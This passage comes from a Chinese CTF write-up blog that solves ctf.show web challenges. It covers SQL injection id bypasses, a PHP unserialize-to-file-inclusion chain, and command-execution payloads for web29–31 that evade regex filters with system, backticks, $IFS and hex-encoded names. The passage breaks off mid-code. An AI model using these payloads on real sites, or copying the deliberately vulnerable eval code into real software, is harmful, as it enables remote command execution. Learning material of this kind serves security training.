tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>用户注册<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>pass<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>post传参，name为值，与此题目源码第一次判断想对应，name不能为空值，然后开始进行sql数据库的操作，第三部进行判断name是否为admin，同时要通过get传入参数c，利用正则匹配来替换所有字符，也就是就要搜索到字符就要执行函数</p><p>有关正则匹配的知识<br>\w：用于匹配字母，数字或下划线字符；<br>\W：用于匹配所有与\w不匹配的字符；<br>“*”元字符规定其前导字符必须在目标对象中出现零次或连续多次；</p><p>在register.php注册名为admin  的账户，登陆的时候满足c的传值也为空格即可</p><pre><code>http://26e33888-9abc-46aa-a3fc-7700e6f8d41e.chall.ctf.show:8080/?c=   ←空格</code></pre><p>得ctfshow{ba51b604-87e6-48bb-bf13-505edd2e8c08}</p><h1 id="2021-4-14（萌新）"><a href="#2021-4-14（萌新）" class="headerlink" title="2021-4-14（萌新）"></a>2021-4-14（萌新）</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><pre class="line-numbers language-php"><code class="language-php"> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>ctf<span class="token punctuation">.</span>show萌新计划web1<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># 包含数据库连接文件</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"config.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 判断get提交的参数id是否存在</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 判断id的值是否大于999</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">999</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token shell-comment comment"># id 大于 999 直接退出并返回错误</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"id error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token shell-comment comment"># id 小于 999 拼接sql语句</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from article where id = $id order by id limit 1 "</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"执行的sql为：$sql&lt;br>"</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># 执行sql 语句</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># 判断有没有查询结果</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token shell-comment comment"># 如果有结果，获取结果对象的值$row</span>            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"id: "</span> <span class="token punctuation">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">.</span> <span class="token string">" - title: "</span> <span class="token punctuation">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"title"</span><span class="token punctuation">]</span><span class="token punctuation">.</span> <span class="token string">" &lt;br>&lt;hr>"</span> <span class="token punctuation">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"content"</span><span class="token punctuation">]</span><span class="token punctuation">.</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token shell-comment comment"># 关闭数据库连接</span>        <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!-- flag in id = 1000 --></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要求构造id=1000，利用十六进制绕过：</p><p>执行的sql为：select * from article where id = 0x3E8 order by id limit 1<br>id: 1000 - title: CTFshowflag </p><hr><p>ctfshow{5b2f045b-59b4-40b3-9034-c59d7670642c}</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>和一一样，因为正则匹配掉的是or</p><h2 id="web3-4-5-6-7"><a href="#web3-4-5-6-7" class="headerlink" title="web3,4,5,6,7"></a>web3,4,5,6,7</h2><p>二进制可以用，?id=0b1111101000</p><h1 id="2021-06-20"><a href="#2021-06-20" class="headerlink" title="2021-06-20"></a>2021-06-20</h1><h2 id="大牛杯-easy-unserialize"><a href="#大牛杯-easy-unserialize" class="headerlink" title="大牛杯-easy_unserialize"></a>大牛杯-easy_unserialize</h2><p>源码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">main</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$settings</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">settings</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span>        <span class="token string">'display_errors'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'On'</span><span class="token punctuation">,</span>        <span class="token string">'allow_url_fopen'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'On'</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">params</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">settings</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">'settings.inc'</span><span class="token punctuation">,</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">params</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="知识补充-php中文手册-："><a href="#知识补充-php中文手册-：" class="headerlink" title="知识补充(php中文手册)："></a>知识补充(php中文手册)：</h3><h4 id="unserialize-callback-func-指令"><a href="#unserialize-callback-func-指令" class="headerlink" title="unserialize_callback_func 指令"></a>unserialize_callback_func 指令</h4><p>如果在解序列化的时候需要实例化一个未定义类，则可以设置回调函数以供调用（以免得到的是不完整的 object “__PHP_Incomplete_Class”）。可通过 php.ini、ini_set() 或 .htaccess 定义’unserialize_callback_func’。每次实例化一个未定义类时它都会被调用。若要禁止这个特性，只需置空此设定。 </p><h4 id="spl-autoload"><a href="#spl-autoload" class="headerlink" title="spl_autoload"></a>spl_autoload</h4><p>它可以接收两个参数，第一个参数是$class_name，表示类名，第二个参数$file_extensions是可选的，表示类文件的扩展名，如果不指定的话，它将使用默认的扩展名.inc或.php</p><h1 id="2021-06-21"><a href="#2021-06-21" class="headerlink" title="2021-06-21"></a>2021-06-21</h1><h2 id="大牛杯-easy-unserialize-1"><a href="#大牛杯-easy-unserialize-1" class="headerlink" title="大牛杯-easy_unserialize"></a>大牛杯-easy_unserialize</h2><h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p>利用回调函数，同时利用file_put_contents函数可以实现其中的文件内容我们可以控制，并利用ini_set达到文件包含目的</p><p>其实unserialize_callback_func还有一个功能，就是可以执行函数，函数的参数是反序列化的类名。(与此解法无关)</p><p>然后根据本地exp分析：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">settings</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">main</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$settings</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">settings</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span>        <span class="token string">'unserialize_callback_func'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'spl_autoload'</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//$this->params=serialize("&lt;?php system('cat /f*');"); 生成settings.inc文件，内容是&lt;?php system('cat /f*');</span>        <span class="token comment" spellcheck="true">//$this->params=serialize(new settings()); 加载settings.inc</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时在反序列化unserialize($this-&gt;params)时如果设置为$this-&gt;params=serialize(new settings())的时候就会触发利用ini_set设置后的设定，ini_set(‘unserialize_callback_func’,’mycallback’); 当反序列化后，PHP会寻找mycallback这个方法来include这个类文件，如果你没定义这个方法则报错。因为spl_autoload 函数的存在第一个参数为settings，第二个参数默认定为php和inc，所以这里则是settings.inc文件，所以此文件会被包含，前提是要先写入木马，或者你要命令执行的参数，然后反序列化调用settings类触发就可以了</p><h1 id="命令执行-2021-06-22"><a href="#命令执行-2021-06-22" class="headerlink" title="命令执行(2021-06-22)"></a>命令执行(2021-06-22)</h1><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h3><p>绕过特殊字符的过滤</p><p>payload：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//flag.php index.php</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'cat f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//glob1</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'cat f?ag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//glob2</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'cat f\lag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//转义字符实现绕过</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat f''lag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=flag.php//直接将题目变成文件包含漏洞</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'cat flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//马中马嵌套过滤</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag|system|php/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">echo</span> `tac fl<span class="token operator">?</span>g<span class="token punctuation">.</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span>`<span class="token punctuation">;</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">echo</span>  <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'nl fl?g.???'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">echo</span>  <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string">'nl fl?g.???'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//此函数与反引号异曲同工</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">echo</span>  <span class="token function">passthru</span><span class="token punctuation">(</span><span class="token string">'nl fl?g.???'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//当所执行的 Unix 命令输出二进制数据，需要直接传送到浏览器的时候,就用他来代替exec和system，调用命令自动去除部分符号：",\</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="其他函数："><a href="#其他函数：" class="headerlink" title="其他函数："></a>其他函数：</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token function">popen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//popen("fla?.???", "r");打开进程文件指针</span><span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//尚未研究</span><span class="token function">pcntl_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//尚未研究</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="考点：-1"><a href="#考点：-1" class="headerlink" title="考点："></a>考点：</h3><p>针对读取文件的命令进行了禁止，同时单引号、点和空格也没了</p><h3 id="payload-姿势要骚-："><a href="#payload-姿势要骚-：" class="headerlink" title="payload(姿势要骚)："></a>payload(姿势要骚)：</h3><p>与[GXYCTF2019]禁止套娃一样骚的一批</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token function">array_rand</span><span class="token punctuation">(</span><span class="token function">array_flip</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">print_r</span><span class="token punctuation">(</span>`nl<span class="token operator">%</span>09fl<span class="token punctuation">[</span>abc<span class="token punctuation">]</span><span class="token operator">*</span>`<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token string">"\x73\x79\x73\x74\x65\x6d"</span><span class="token punctuation">(</span><span class="token string">"nl%09fl[a]*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//等价于system(),说明双引号会自动解析</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">echo</span>`strings<span class="token operator">%</span>09f<span class="token operator">*</span>`<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//在对象文件或二进制文件中查找可打印的字符串</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">echo</span>`strings\<span class="token variable">$IFS</span>\<span class="token variable">$9f</span><span class="token operator">*</span>`<span class="token operator">/</span>必须加转义字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="总结问题："><a href="#总结问题：" class="headerlink" title="总结问题："></a>总结问题：</h3><p><a href="https://www.runoob.com/linux/linux-file-content-manage.html" target="_blank" rel="noopener">Linux 文件与目录管理</a></p><p>linux文件内容查看：</p><ul><li>cat 由第一行开始显示文件内容</li><li>tac 从最后一行开始显示，可以看出 tac 是 cat 的倒着写！</li><li>nl  显示的时候，顺道输出行号！</li><li>more 一页一页的显示文件内容</li><li>less 与 more 类似，但是比 more 更好的是，他可以往前翻页！</li><li>head 只看头几行</li><li>tail 只看尾巴几行</li><li>od:以二进制的方式读取档案内容</li><li>vi:一种编辑器，这个也可以查看</li><li>vim:一种编辑器，这个也可以查看</li><li>sort:可以查看</li><li>uniq:可以查看 file -f:报错出具体内容 grep(尚未研究)</li><li>在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings</li></ul><h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token 